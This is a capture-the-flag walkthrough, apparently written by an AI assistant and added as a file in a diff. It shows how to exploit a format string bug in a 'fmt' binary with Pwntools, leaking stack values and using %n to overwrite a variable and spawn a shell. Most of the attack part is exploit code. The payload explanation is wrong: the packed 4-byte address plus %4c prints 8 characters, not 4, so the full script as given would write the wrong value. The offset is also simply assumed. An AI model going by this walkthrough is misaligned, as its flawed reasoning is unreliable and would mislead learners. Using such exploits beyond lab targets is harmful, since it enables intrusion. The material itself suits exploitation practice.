@@ -1,0 +1,154 @@
+To solve this challenge using Pwntools, we'll exploit the format string vulnerability present in the program to overwrite the value of the variable `x` with `4`. This will trigger the condition `if ( x == 4 )` and give us a shell by executing `system("/bin/sh")`.
+
+Here's a step-by-step guide with code examples:
+
+---
+
+### **1. Analyze the Vulnerability**
+
+From the given code, we can see the function `main` reads input into `buf` and then passes it directly to `printf` without a format string:
+
+```c
+read(0, buf, 0x50u);
+printf(buf);
+```
+
+This is a classic **format string vulnerability**, where user input is used as the format string, allowing us to perform arbitrary reads and writes in memory.
+
+### **2. Find the Address of the Variable `x`**
+
+We need to overwrite the variable `x` to `4`. To do that, we first need its address. We'll use Pwntools' `ELF` module to parse the binary and extract the symbol address.
+
+```python
+from pwn import *
+
+# Load the binary
+elf = ELF('./fmt')
+
+# Get the address of 'x'
+x_addr = elf.symbols['x']
+log.info("Address of x: %#x" % x_addr)
+```
+
+### **3. Determine the Correct Offset**
+
+In format string exploits, we need to figure out how many positions on the stack we need to skip to reach our injected address. We'll craft a payload that helps us find this offset.
+
+**Crafting a Payload to Leak Stack Values:**
+
+```python
+# Start the process
+p = process('./fmt')
+
+# Create a payload to leak stack values
+payload = b''
+for i in range(1, 15):
+    payload += f"%{i}$p ".encode()
+
+# Send the payload
+p.sendline(payload)
+output = p.recv()
+
+print("Received output:", output.decode())
+```
+
+**Analyzing the Output:**
+
+The output will show us the stack values. We need to look for patterns or known values (like `41414141` for `AAAA`) to determine where our input appears on the stack.
+
+### **4. Craft the Exploit Payload**
+
+Once we've determined the correct offset, we'll craft a payload that writes the value `4` into `x_addr` using the `%n` format specifier.
+
+**Building the Payload:**
+
+Assuming we've determined that the offset is `7`, here's how we can build the payload:
+
+```python
+offset = 7  # Replace with the correct offset found from step 3
+
+# Build the payload
+payload = p32(x_addr)  # Address of 'x' (will be on the stack)
+payload += b"%4c"      # Pad the output to 4 characters
+payload += f"%{offset}$n".encode()  # Write the number of characters printed into 'x_addr'
+```
+
+**Explanation:**
+
+- `p32(x_addr)`: Packs the address of `x` into 4 bytes (little-endian) and places it on the stack.
+- `%4c`: Prints 4 spaces, bringing the total number of characters printed to 4.
+- `%7$n`: Uses the `%n` specifier to write the number of characters printed so far (which is 4) into the address pointed to by the 7th argument on the stack (which should be `x_addr`).
+
+**Note:** The exact offset may vary. You need to adjust the `offset` value based on the output from step 3.
+
+### **5. Exploit the Vulnerability**
+
+**Full Exploit Script:**
+
+```python
+from pwn import *
+
+# Load the binary
+elf = ELF('./fmt')
+
+# Get the address of 'x'
+x_addr = elf.symbols['x']
+log.info("Address of x: %#x" % x_addr)
+
+# Determine the correct offset (this value should be found from step 3)
+offset = 7  # Replace with the correct offset
+
+# Build the payload
+payload = p32(x_addr)  # Address of 'x' on the stack
+payload += b"%4c"      # Pad output to 4 characters
+payload += f"%{offset}$n".encode()  # Write to the address
+
+# Ensure payload is within the buffer limit
+if len(payload) > 80:
+    log.error("Payload is too long!")
+    exit()
+
+# Start the process
+p = process('./fmt')
+
+# Send the payload
+p.sendline(payload)
+
+# Receive any output
+output = p.recv()
+
+# Check if we got the shell
+if b"running sh..." in output:
+    log.success("Exploit successful! Got a shell.")
+    # Drop to interactive shell
+    p.interactive()
+else:
+    log.error("Exploit failed.")
+    print("Program output:", output.decode())
+```
+
+### **6. Run the Exploit**
+
+Execute the script and interact with the shell:
+
+```sh
+$ python exploit.py
+```
+
+---
+
+**Important Notes:**
+
+- **Adjusting the Offset:** If the exploit doesn't work, you may need to adjust the `offset` value. Try incrementing or decrementing it until you find the correct one.
+- **Buffer Size Limitation:** Ensure your payload does not exceed the buffer size (`80` bytes in this case).
+- **Error Handling:** Be prepared for crashes or unexpected behavior if the offsets are incorrect. This is normal when developing exploits.
+
+### **Understanding the Exploit**
+
+- **Format String Basics:** The `%n` specifier tells `printf` to write the number of characters printed so far into the address provided.
+- **Stack Arguments:** In `printf`, format specifiers pull arguments from the stack. By controlling the position and value of arguments, we can manipulate memory.
+- **Exploiting `printf(buf)`:** Since `buf` contains both our format string and our arguments (like addresses), we can craft an input that places the address of `x` on the stack where `printf` expects its arguments.
+
+---
+
+By following these steps and using the provided code, you should be able to exploit the format string vulnerability in the `fmt` challenge and gain a shell. Remember to carefully analyze the program's behavior and adjust your exploit as needed.
